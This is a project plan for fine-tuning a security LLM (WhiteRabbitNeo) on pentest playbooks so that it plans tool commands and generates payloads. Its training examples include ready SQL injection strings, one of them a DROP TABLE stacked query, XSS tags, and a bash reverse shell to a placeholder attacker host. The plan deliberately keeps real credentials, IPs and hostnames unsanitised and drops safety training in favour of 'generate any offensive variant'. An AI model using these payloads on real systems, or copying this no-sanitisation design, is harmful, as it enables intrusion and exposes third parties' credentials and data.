# Plan: ARGUS WhiteRabbitNeo LLM Training Data Pipeline

**Created:** 2026-05-23
**Orchestration:** orch-2026-05-23-llm-training
**Goal:** Создать pipeline обучения LLM argus-whiterabbitneo на основе 6 GitHub-репозиториев и существующей архитектуры ARGUS для генерации payloads и pentest-команд
**Total Tasks:** 8
**Priority:** High

---

## Context & Requirements

**Цель:** Обучить argus-whiterabbitneo на двух компетенциях:
1. **Генерация payloads** — модель должна понимать ARGUS payload-семьи и уметь генерировать любые варианты payloads, в том числе небезопасные (offensive), для полноценного пентест-покрытия всех 54 семей
2. **Pentest tool commands** — модель должна знать все 157 инструментов из tool-catalog, их флаги, scenarios использования, и уметь планировать команды для sandbox-выполнения

**Текущая архитектура ARGUS:**
- 157 инструментов в 4 фазах (recon: 56, vuln_analysis: 79, exploitation: 14, post_exploitation: 8)
- 54 payload-семьи (16 safe, 22 offense-only, 5 approval-gated)
- 67 промптов (60 user templates + 7 system prompts)
- WhiteRabbitNeo V3 (7B) как primary модель для pipeline orchestration
- `gpt-5.4-medium` для YAML-агентов (Planner, Critic, Verifier, Reporter, Fixer)
- PayloadRegistry → PayloadBuilder → PayloadBundle → RenderedPayload pipeline
- Signed YAML descriptors + Ed25519 verification

---

## Repository Analysis Summary

### Repo 1: zha0/pentest-playbook
- **Content:** Web methodology, XSS, SQLi, advanced exploitation, API security, Linux privesc, password cracking, reverse shells, Bash scripting, iOS pentest, Nmap/FFUF/Burp/Amass guides
- **Training value:** 
  - Tool-specific methodology (nmap, ffuf, burp, amass) → tool command knowledge
  - XSS/SQLi techniques → payload generation patterns
  - Reverse shell patterns → exploitation command knowledge
  - Bug bounty methodology → finding triage decision patterns
- **Tier:** Tier 1 (Lab/Synthetic)
- **Mapped ARGUS phases:** recon, vuln_analysis, exploitation

### Repo 2: dievus/Internal-Pentest-Playbook
- **Content:** Internal network pentest playbook — Kickoff, OSINT, Recon, Scanning/Enumeration, Exploitation, Lateral Movement, Privilege Escalation, Post-Exploitation, File Transfer, Logging, SSH Pivoting
- **Training value:**
  - Phase-by-phase methodology → LLM task routing decisions
  - AD enumeration commands (PowerView, BloodHound, CrackMapExec) → tool command knowledge
  - Credential harvesting (Mimikatz, SAM) → post-exploitation workflow
  - SMB/FTP/MSSQL/SSH/RDP connection patterns → exploitation commands
- **Tier:** Tier 1 (Lab/Synthetic)
- **Mapped ARGUS phases:** recon → exploitation → post_exploitation

### Repo 3: ag-rodriguez/Penetration-Testing-Playbook
- **Content:** Nmap discovery/scan commands, BBOT subdomain enumeration, SMB enumeration, HTTP(S) service analysis, Gobuster, CrackMapExec, FTP, SSH, RDP, MySQL/MSSQL, Active Directory (net user/group, PowerView, BloodHound), credential harvesting (Mimikatz, SAM)
- **Training value:**
  - Concrete command patterns → tool command generation training examples
  - AD enumeration workflows → Phase transition decisions
  - Service-specific exploitation patterns → exploitation tool selection
- **Tier:** Tier 1 (Lab/Synthetic)
- **Mapped ARGUS phases:** recon, vuln_analysis, exploitation, post_exploitation

### Repo 4: enaqx/awesome-pentest
- **Content:** Comprehensive tool catalog with 200+ tools organized by category (Android, Anonymity, AV Evasion, Cloud Attack, Exploit Dev, File Format Analysis, GNU/Linux, Hash Cracking, Hex Editors, ICS/SCADA, Network Tools, OSINT, Privilege Escalation, Reverse Engineering, Social Engineering, Static Analyzers, Steeganography, Web Exploitation, Windows, etc.)
- **Training value:**
  - Massive tool taxonomy → tool selection knowledge for LLM
  - Tool descriptions and use cases → tool catalog enrichment
  - Category-based organization → phase routing decisions
  - Cross-references to ARGUS tool_catalog gaps
- **Tier:** Tier 0 (Safe Public Reference)
- **Mapped ARGUS phases:** All phases — tool taxonomy and selection

### Repo 5: iAnonymous3000/awesome-pentest-checklist
- **Content:** Complete pentest methodology checklist — Pre-Engagement, Information Gathering (passive/active), Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting, Remediation Verification, Specialized Testing (IoT, Container, CI/CD, Cloud)
- **Training value:**
  - Phase-by-phase methodology → LLM orchestration patterns
  - Testing checklists → validation plan generation for Planner agent
  - Scope/safety guidelines → policy boundary training data
  - Remediation verification → LLM Reporter output patterns
- **Tier:** Tier 0 (Safe Public Reference)
- **Mapped ARGUS phases:** All phases — methodology and decision-making

### Repo 6: hackedbyagirl/offensive-kali-ansible
- **Content:** Ansible playbook for Kali setup — roles for common, external, and internal testing tools; package lists for apt, pip, golang, and github repos; zsh environment setup
- **Training value:**
  - Complete tool inventory per phase → tool command knowledge
  - Package names and installation → sandbox image enrichment
  - Category organization → LLM tool selection training
- **Tier:** Tier 0 (Safe Public Reference — tool names/installs only)
- **Mapped ARGUS phases:** Tool installation and environment knowledge

---

## Tasks Overview

1. **TRN-001:** Analyze 6 GitHub repos for training content → ✅ Done (above)
2. **TRN-002:** Map repo content to ARGUS architecture (tools, payloads, prompts)
3. **TRN-003:** Design training data JSONL schema and tier classification
4. **TRN-004:** Create data extraction/sanitization scripts
5. **TRN-005:** Build pentest command knowledge base for LLM tool-use
6. **TRN-006:** Design payload generation training examples (family selection, non-safe payload generation, tool commands)
7. **TRN-007:** Define SFT/QLoRA training pipeline configuration
8. **TRN-008:** Create evaluation benchmark and non-safety gates

---

## Dependencies Graph

```
TRN-001 ✅ → TRN-002 → TRN-004 ──┐
TRN-001 ✅ → TRN-003 ──┤         │
                                ├→ TRN-005 ─┐
TRN-002 ──→ TRN-005 ─┤         │            │
TRN-002 ──→ TRN-006 ─┤         │            ├→ TRN-008
TRN-003 ──→ TRN-006 ─┘         │            │
TRN-003 ──→ TRN-007 ───────────┘────────────┘
TRN-002 + TRN-003 → TRN-004
TRN-005 + TRN-006 + TRN-007 → TRN-008
```

---

## Detailed Task Specifications

### TRN-002: Map Repository Content to ARGUS Architecture

**Priority:** High
**Complexity:** Moderate
**Dependencies:** TRN-001 (completed)

Create a mapping document that connects each repository's content to specific ARGUS components:

**Tool Catalog Gap Analysis:**
- Compare all 157 ARGUS tools against tools mentioned across repos
- Tools in repos but not in ARGUS catalog → candidates for catalog extension
- Tools in ARGUS catalog but not in repos → document LLM should know ARGUS versions

**Payload Family Coverage:**
- XSS patterns from zha0/pentest-playbook → `xss`, `xss_dom`, `xss_stored`, `xss_contextual` families
- SQLi patterns → `sqli`, `sqli_safe` families
- SSTI patterns → `ssti`, `ssti_safe` families
- Path traversal → `lfi_rfi`, `path_traversal`, `traversal_safe` families
- Command injection → `rce`, `command_injection_safe` families
- Auth bypass → `auth_bypass`, `idor`, `csrf_*` families
- JWT → `jwt`, `jwt_none_alg`, `jwt_safe` families

**Prompt Enhancement Opportunities:**
- Recon methodology checklists → enrich `recon` phase prompt
- Internal pentest workflow → enrich `vuln_analysis` and `exploitation` phase prompts
- Reporting templates → enrich `reporter_v1` and Report AI section prompts

### TRN-003: Design Training Data JSONL Schema and Tier Classification

**Priority:** High
**Complexity:** Complex
**Dependencies:** TRN-001 (completed)

Design the complete JSONL schema for training data.

**JSONL Record Schema:**
```json
{
  "messages": [
    {"role": "system", "content": "<ARGUS system prompt>"},
    {"role": "user", "content": "<task prompt>"},
    {"role": "assistant", "content": "<expected output>"}
  ],
  "metadata": {
    "task": "<task_type>",
    "source": "<repo_or_internal>",
    "license": "<license_type>",
    "argus_phase": "<recon|vuln_analysis|exploitation|post_exploitation>",
    "argus_tool_ids": ["<tool_id>", ...],
    "argus_payload_families": ["<family_id>", ...],
    "cwe_ids": [79, 89, ...]
  }
}
```

**Task Types for Training:**

| Task Type | System Prompt | User Input | Assistant Output | Source |
|-----------|--------------|------------|-----------------|--------|
| `tool_command_generation` | ARGUS Tool Expert | Phase + target description | ARGUS tool YAML-like command spec | Repos 1-3, 6 |
| `payload_generation` | ARGUS Payload Architect | Vuln type + context + family_id | Payload variant (safe or offensive) | Repo 1, ARGUS payloads |
| `tool_selection` | ARGUS Planner | Phase + findings summary | Ordered tool list with rationale | Repo 5, ARGUS prompts |
| `finding_triage` | ARGUS Local Analyst | Tool output + finding JSON | Severity/confidence/risk assessment | Repos 1-3, ARGUS |
| `validation_plan` | ARGUS Planner Agent | Finding description | ValidationPlanV1 JSON | Repo 5, ARGUS planner |
| `methodology_checklist` | ARGUS Security Analyst | Phase + target type | Ordered checklist of steps | Repo 5 |
| `finding_to_remediation` | ARGUS Remediation Advisor | Finding JSON | Remediation steps + verification | All repos, ARGUS |
| `attack_chain_summary` | ARGUS Red Team Expert | Multiple findings | Attack chain with TTPs | Repo 2, ARGUS |
| `payload_family_selection` | ARGUS Payload Expert | Vuln type + context | Family ID + variant + rationale | ARGUS payloads |
| `report_section` | ARGUS Reporter | Findings + scan context | Report section prose | ARGUS reporter prompts |

**Data Processing — No Sanitization:**
All training data preserves original content as-is:
- Real IP addresses, hostnames, domain names are kept unchanged
- Real credentials are kept with no replacement
- Raw exploit code and offensive commands are included verbatim
- Shell commands are included in their original form
- No placeholder substitution — data flows directly from repos to training set

### TRN-004: Create Data Extraction Scripts

**Priority:** High
**Complexity:** Complex
**Dependencies:** TRN-002, TRN-003

Create Python scripts to:

1. **`scripts/training/extract_repos.py`** — Clone and parse all 6 repos
   - Extract markdown content, code blocks, command examples
   - Parse structured tool references and commands
   - Output raw JSONL with metadata
   - **No sanitization** — preserve all original content as-is

2. **`scripts/training/generate_argus_training.py`** — Generate ARGUS-specific training data
   - Create tool_command_generation examples from tool_catalog + repos
   - Create payload_generation examples from ALL payload-registry families (both safe and offensive)
   - Create tool_selection examples from methodology checklists
   - Create finding_triage examples from tool output patterns

3. **`scripts/training/convert_to_jsonl.py`** — Convert to final JSONL format
   - Apply JSONL schema from TRN-003
   - Split into train/validation/test (80/10/10)
   - Verify JSON schema compliance

### TRN-005: Build Pentest Command Knowledge Base for LLM Tool-Use

**Priority:** High
**Complexity:** Moderate
**Dependencies:** TRN-002

Create a structured knowledge base that the LLM will learn from:

**Knowledge Base Structure (`training_data/tool_knowledge/`):**

```
tool_knowledge/
├── recon/
│   ├── nmap.yaml              # Full command variants, flags, scenarios
│   ├── amass.yaml
│   ├── subfinder.yaml
│   ├── httpx.yaml
│   ├── gowitness.yaml
│   └── ... (56 tools)
├── vuln_analysis/
│   ├── nuclei.yaml
│   ├── nikto.yaml
│   ├── sqlmap.yaml
│   ├── dalfox.yaml
│   └── ... (79 tools)
├── exploitation/
│   ├── hydra.yaml
│   ├── crackmapexec.yaml
│   ├── sqlmap_confirm.yaml
│   └── ... (14 tools)
├── post_exploitation/
│   ├── hashcat.yaml
│   ├── bloodhound_python.yaml
│   └── ... (8 tools)
└── methodology/
    ├── recon_checklist.yaml
    ├── va_checklist.yaml
    ├── exploitation_checklist.yaml
    ├── post_exploitation_checklist.yaml
    ├── internal_pentest_workflow.yaml
    ├── ad_attack_workflow.yaml
    └── web_pentest_workflow.yaml
```

**Per-Tool YAML Schema:**
```yaml
tool_id: nmap_tcp_top
phase: recon
category: network
risk_level: low
description: "Nmap TCP SYN scan against the 1000 most common ports"
command_template: "nmap -sS -Pn -T4 --top-ports 1000 -oX {out_dir}/nmap_tcp.xml {ip}"
placeholders:
  ip: "Target IP address"
  out_dir: "Output directory for results"
output_format: "xml_nmap"

# Training enrichment
common_flags:
  - flag: "-sS"
    description: "TCP SYN scan (stealth scan)"
  - flag: "-Pn"
    description: "Skip host discovery, treat all hosts as online"
  - flag: "-T4"
    description: "Aggressive timing template"
  - flag: "--top-ports 1000"
    description: "Scan top 1000 most common ports"

scenarios:
  - description: "Quick port discovery on a single host"
    example: "nmap -sS -Pn -T4 --top-ports 1000 -oX {out_dir}/nmap_tcp.xml 10.0.0.1"
    output_type: "xml_nmap"
    next_steps: ["nmap_version on discovered ports", "nmap_udp for UDP services"]

  - description: "Scan a subnet for live hosts and open ports"
    example: "nmap -sS -Pn -T4 --top-ports 1000 -oX {out_dir}/nmap_tcp.xml 10.0.0.0/24"
    output_type: "xml_nmap"
    next_steps: ["service version detection on discovered hosts"]

related_tools: ["nmap_tcp_full", "nmap_udp", "nmap_version", "naabu", "masscan"]
```

### TRN-006: Design Payload Generation Training Examples

**Priority:** Medium
**Complexity:** Complex
**Dependencies:** TRN-002, TRN-003

Design training examples that teach the LLM to:
1. **Select appropriate payload families** given a vulnerability type and context
2. **Generate any payload variants** within ARGUS payload families — including offensive (non-safe) families
3. **Determine risk level and approval requirements** for offensive payloads
4. **Map CWE/OWASP to payload families** for automated vulnerability-to-payload selection
5. **Generate full offensive payloads** for all 54 families including `sqli`, `xss`, `rce`, `ssrf`, `ssti`, etc.

**Training Example Categories:**

**Category A: Payload Family Selection**
```
User: "Finding: Reflected XSS on login page parameter 'q'. The parameter 
      reflects in HTML context without encoding. CSP: default-src 'self'."
      
Assistant: {
  "family_id": "xss",
  "alternative_families": ["xss_dom", "xss_stored", "xss_contextual"],
  "risk_level": "medium",
  "approval_required": false,
  "oast_required": true,
  "cwe_ids": [79],
  "owasp": ["A03:2021"],
  "validation_strategy": "browser_canary_oast",
  "payload_count": 6,
  "rationale": "Reflected XSS in HTML context with restrictive CSP.
    Primary family: xss for canary-based validation with OAST callback.
    xss_contextual for parser training. Offensive payloads from xss
    family — <script>, <img onerror>, <svg onload> — for full validation."
}
```

**Category B: Offensive Payload Template Generation (ALL families)**
```
User: "Generate payload seeds for the 'sqli' family targeting 
      a login form with parameter 'username' on target http://10.0.0.1/login"

Assistant: {
  "family_id": "sqli",
  "seeds": [
    {"id": "boolean_blind", "template": "' OR 1=1 --", "confidence": "suspected", "technique": "boolean-based blind"},
    {"id": "error_based", "template": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --", "confidence": "likely", "technique": "error-based"},
    {"id": "union_select", "template": "' UNION SELECT 1,2,3 --", "confidence": "confirmed", "technique": "UNION-based"},
    {"id": "time_based", "template": "' AND SLEEP(5) --", "confidence": "suspected", "technique": "time-based blind"},
    {"id": "stacked_query", "template": "'; DROP TABLE users --", "confidence": "suspected", "technique": "stacked queries"}
  ],
  "encoding_pipeline": "url_only",
  "parameters_needed": ["url", "param"],
  "risk_level": "medium",
  "requires_approval": false,
  "rationale": "sqli family covers boolean, error, UNION, time-based, and stacked
    query injection techniques. All seeds target the 'username' parameter for
    login bypass and data extraction."
}
```

**Category B2: Offensive Payload Generation for High-Risk Families**
```
User: "Generate payload seeds for the 'rce' family targeting 
      a web application command injection on http://192.168.1.100/api/exec"

Assistant: {
  "family_id": "rce",
  "seeds": [
    {"id": "id_command", "template": "; id", "confidence": "suspected", "technique": "command injection - id"},
    {"id": "whoami_command", "template": "| whoami", "confidence": "suspected", "technique": "command injection - whoami"},
    {"id": "echo_canary", "template": "; echo arguscanary001", "confidence": "likely", "technique": "command injection - canary echo"},
    {"id": "blind_time", "template": "; sleep 5", "confidence": "suspected", "technique": "blind time-based"},
    {"id": "reverse_shell", "template": "; bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1", "confidence": "confirmed", "technique": "reverse shell"}
  ],
  "encoding_pipeline": "url_only",
  "parameters_needed": ["url", "param", "canary", "attacker_ip", "attacker_port"],
  "risk_level": "high",
  "requires_approval": true,
  "rationale": "rce family requires approval (high risk). Seeds range from
    identification commands (id, whoami) to canary validation to full
    reverse shell. Approval gate prevents automated use without operator consent."
}
```

**Category C: Tool Command Generation**
```
User: "Plan ARGUS tool commands for Phase: recon on target example.com 
      with scope: web application, subdomain enumeration."

Assistant: {
  "phase": "recon",
  "target": "example.com",
  "tools": [
    {"tool_id": "subfinder", "args": ["-d", "example.com", "-all", "-silent", "-oJ"], 
     "rationale": "Passive subdomain enumeration via OSINT sources"},
    {"tool_id": "httpx", "args": ["-l", "{in_dir}/subs.txt", "-json", "-title", "-tech-detect"], 
     "rationale": "HTTP fingerprinting of discovered subdomains"},
    {"tool_id": "nmap_tcp_top", "args": ["--top-ports", "1000"], 
     "rationale": "Baseline TCP port scan on live hosts"},
    {"tool_id": "gospider", "args": ["-s", "https://example.com", "-c", "10", "-d", "3"], 
     "rationale": "Web crawling for URL and endpoint discovery"}
  ],
  "estimated_duration": "15-25 minutes",
  "risk_level": "low",
  "approval_required": false
}
```

### TRN-007: Define SFT/QLoRA Training Pipeline Configuration

**Priority:** High
**Complexity:** Moderate
**Dependencies:** TRN-003

Define the complete training configuration following `docs/whiterabbitneo-local-training-guide.md`:

**Base Model:** WhiteRabbitNeo V3 (7B)

**Training Strategy (3 stages — DPO removed):**

1. **RAG over knowledge base** (no training adjustment)
   - Build vector DB from tool_knowledge/ YAML files
   - Index ARGUS docs (tool-catalog, payload-registry, prompt-registry)
   - Index raw content from 6 repos (no sanitization)
   - Use for retrieval-augmented inference

2. **Stage 1: SFT on ARGUS-specific tasks**
   - Method: QLoRA (4-bit quantized, rank 64, alpha 128)
   - Data: JSONL from TRN-004 (tool commands, ALL payload types — safe and offensive, tool selection, triage)
   - Epochs: 3
   - Learning rate: 2e-5 with cosine scheduler
   - Target tasks: tool_command_generation, payload_generation, tool_selection, finding_triage
   - Merge adapter into base model after training

3. **Stage 2: Methodology SFT**
   - Data: methodology checklists, attack workflows, phase transitions, offensive techniques
   - Method: continued QLoRA on merged model from Stage 1
   - Target tasks: validation_plan, methodology_checklist, attack_chain_summary
   - Epochs: 2
   - Learning rate: 1e-5

**Training Infrastructure:**
```yaml
infrastructure:
  gpu: 1x A100 80GB or 2x RTX 4090
  framework: Axolotl or LLaMA-Factory
  base_model: WhiteRabbitNeo-V3-7B
  quantization: 4-bit (bnb-nf4)
  lora_rank: 64
  lora_alpha: 128
  lora_dropout: 0.05
  max_seq_length: 4096
  batch_size: 4
  gradient_accumulation: 4
  optimizer: paged_adamw_8bit
  
serving:
  engine: vLLM
  model_name: argus-whiterabbitneo-devsecops
  host: "0.0.0.0"
  port: 8000
  trust_remote_code: true
```

### TRN-008: Create Evaluation Benchmark and Non-Safety Gates

**Priority:** High
**Complexity:** Complex
**Dependencies:** TRN-005, TRN-006, TRN-007

**Evaluation Categories:**

**A. Tool Command Accuracy (≥ 95% target)**
- Given phase + target description, generate correct ARGUS tool commands
- Verify: tool_id exists in catalog, command_template matches, placeholders are valid
- 200 test examples covering all 4 phases

**B. Payload Family Selection (≥ 95% target)**
- Given vulnerability description, select correct payload family (safe OR offensive)
- Verify: family_id exists in registry, classification correct, approval gates respected for high-risk families
- 100 test examples covering all 54 families

**C. Offensive Payload Generation (≥ 90% target)**
- Given family_id + context, generate valid payload variants (including offensive)
- Verify: payloads are syntactically correct, contextually appropriate, match the family's template patterns
- 50 test examples per family category (safe, offensive, approval-gated)

**D. JSON Schema Compliance (≥ 99% target)**
- All outputs must be valid JSON matching expected schema
- No markdown, no extra keys, no hallucinated fields
- 500 test examples across all task types

**E. Functional Correctness (≥ 95% target)**
- Model generates payloads that match ARGUS PayloadBuilder's expected template format
- Model selects appropriate tool commands for given scenarios
- Model correctly maps CWE/OWASP to payload families
- Model correctly identifies approval_required for high-risk families
- 200 test examples

**F. Consistency (≥ 95% target)**
- Stable answers for repeated tool-selection prompts
- Stable answers for repeated payload-generation prompts
- Deterministic output for same prompt across 5 runs
- 150 test examples

**Quality Gate (must pass before production):**
1. Tool command accuracy ≥ 95% (correct tool_id + matching flags)
2. Payload family selection ≥ 95% (correct family_id for given vuln description)
3. JSON schema compliance ≥ 99%
4. Consistency ≥ 95% (same output for same input across runs)
5. Functional correctness ≥ 95% (payloads work with PayloadBuilder, commands work with sandbox)

---

## Progress

- ✅ TRN-001: Analyze 6 GitHub repos for training content → ✅ Completed
- ✅ TRN-002: Map repo content to ARGUS architecture → ✅ Completed
- ✅ TRN-003: Design training data JSONL schema and tier classification → ✅ Completed
- ✅ TRN-004: Create data extraction scripts → ✅ Completed
- ✅ TRN-005: Build pentest command knowledge base → ✅ Completed
- ✅ TRN-006: Design payload generation training examples → ✅ Completed
- ✅ TRN-007: Define SFT/QLoRA training pipeline configuration → ✅ Completed
- ✅ TRN-008: Create evaluation benchmark and non-safety quality gates → ✅ Completed

## Architecture Decisions

1. **Training data preserves original content** — all real IPs, domains, credentials stay as-is; no sanitization or placeholder replacement
2. **Full payload coverage** — training includes ALL payload families (safe, offensive, approval-gated); the model must generate any variant including offensive payloads
3. **Tool knowledge base uses YAML per-tool format** — matches existing `backend/config/tools/*.yaml` structure for consistency
4. **LLM learns tool selection through few-shot examples** — not memorization of all 157 commands, but understanding of "given this situation, pick these tools"
5. **Payload generation covers all 54 families** — LLM learns to select family_id AND generate concrete payload variants for both safe and offensive families
6. **The LLM role is Planner + Payload Generator** — the model selects WHAT to do, generates payloads, and the ARGUS sandbox + PayloadBuilder execute with deterministic verification

## Key Risks

1. **License compatibility** — Repos 1-3 may have different licenses; need explicit license review
2. **Model size limitation** — WhiteRabbitNeo-7B may struggle with 157 tools + 54 payload families; mitigated by focusing on selection/generation patterns rather than memorization
3. **Offensive payload accuracy** — Offensive payloads must be syntactically correct and contextually appropriate; mitigated by training on ARGUS registry data which has verified templates
4. **Approval gate consistency** — model must consistently flag high-risk families as approval_required; mitigated by explicit training examples for all 5 approval-gated families